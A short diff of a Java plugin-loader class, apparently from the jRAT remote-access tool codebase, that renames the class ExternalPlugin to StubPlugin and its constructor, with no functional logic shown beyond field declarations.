@@ -12,13 +12,13 @@ import pro.jrat.utils.IOUtils;
 
 
 
-public class ExternalPlugin {
+public class StubPlugin {
 
 	public String path;
 	public String clazz;
 	public String name;
 
-	public ExternalPlugin(String path, boolean load) {
+	public StubPlugin(String path, boolean load) {
 		this.path = path;
 		if (load) {
 			try {
